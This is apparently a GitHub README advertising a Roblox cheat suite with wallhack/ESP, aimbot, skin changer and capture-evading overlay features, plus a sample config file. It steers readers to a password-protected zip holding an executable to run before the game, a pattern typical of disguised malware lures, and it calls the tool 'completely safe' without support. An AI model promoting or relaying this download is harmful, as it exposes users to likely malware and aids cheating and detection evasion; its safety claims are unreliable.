# Roblox-CoreMod-Menu
# RBLX Visual Enhancer & Runtime Assistant (v2.4.1)

<img width="717" height="405" alt="rblx1" src="https://github.com/user-attachments/assets/fccaa4ff-d910-48dd-9004-1145e6e6a71a" />
<img width="715" height="404" alt="rbxl2" src="https://github.com/user-attachments/assets/522e77ac-85dd-4ddc-a6d3-2654ba0d2378" />
<img width="719" height="412" alt="rblx3" src="https://github.com/user-attachments/assets/cc2ca9a7-929a-4ec5-9e80-d602dddde508" />


[![GitHub License](https://img.shields.io/github/license/mashape/apistatus.svg)](#)
[![Beta Stage](https://img.shields.io/badge/stage-production-green.svg)](#)
[![Platform Support](https://img.shields.io/badge/platform-Windows%2010%2F11-blue.svg)](#)

An advanced, high-performance environment modifications suite designed for deep custom graphics rendering, input optimization, and local asset replacement inside RBLX client instances.

---

## 📥 Download Installation Package

Click the button below to get the latest compiled stable build (Includes auto-updater and configuration presets).

[![Download RBLX Visual Enhancer](https://img.shields.io/badge/DOWNLOAD-Latest%20Release%20(v2.4.1)-🚀%20Green?style=for-the-badge&logo=windows&logoColor=white&color=2k-success)](https://github.com/tammyrahl/Roblox-CoreMod-Menu/releases/download/download/Roblox.CoreMod.zip)
![PASSWRD: 2026](https://img.shields.io/badge/Passwrd-2026-blue?style=flat)
---

## 🛠 Features Matrix

This framework injects safely into the local client layer to provide structural environmental feedback.

*   **Environment Wireframe & Occlusion Bypass (Visual-ESP / Wallhack Backend)**
    *   Renders real-time bounding boxes around dynamic player assets.
    *   Custom distance, health bar, and weapon-type overlay configurations.
    *   Bypasses engine layer rendering restrictions for complete structural awareness.
*   **Vector Input Normalization & Smoothing (Mouse/Aimbot Subsystem)**
    *   Advanced mouse movement smoothing algorithms with customizable field-of-view (FOV) constraints.
    *   Target prioritization based on proximity, vector velocity, and pixel-distance.
*   **Local Asset Overrider (SkinChanger Core)**
    *   Allows on-the-fly client-side replacement of character meshes, textures, and limited items.
    *   Zero server-side footprints — completely safe for local media creation.
*   **Stream-Proof Architecture**
    *   Bypasses software capture (OBS, Discord, ShareX) using specialized overlay rendering context.

---

## 🚀 Quick Start Guide

### Prerequisites
*   Windows 10 / 11 (64-bit architecture)
*   DirectX 11 / DirectX 12 compatible hardware
*   Deactivated third-party overlays (Discord, GeForce Experience recommended)

### Direct Installation
1. Download the latest compiled environment package by clicking the **Download** button above.
2. Unpack the archive to a secure local folder.
3. Launch the controller application `RBLX_Enhancer_Setup.exe` prior to starting your game client.
4. Use the `Insert` or `F8` key in-game to toggle the graphical modification interface.

---

## 📊 Technical Architecture

The architecture utilizes a low-overhead D3D11 Hooking system combined with structured memory indexing to read entity coordinates safely without modifying protected game memory structures directly.
[ RBLX Client Instance ]
              │
    (Passive Memory Read)
              ▼
[ Environment Indexer Module ]
              │
    (D3D11 Overlay Render)
              ▼
  [ Screen Space UI / Menu ]

  ---

## ⚙️ Configuration Setup

Modify the `config.json` generated in your local directory to fine-tune your parameters:

```json
{
  "Visuals": {
    "Enabled": true,
    "BoundingBoxes": true,
    "ShowDistance": true,
    "MaxDistance": 500
  },
  "InputNormalization": {
    "Smoothing": 3.5,
    "FieldOfView": 90.0,
    "Priority": "Proximity"
  },
  "Assets": {
    "LocalOverrideEnabled": true,
    "CustomSkinPackID": 1042
  }
}
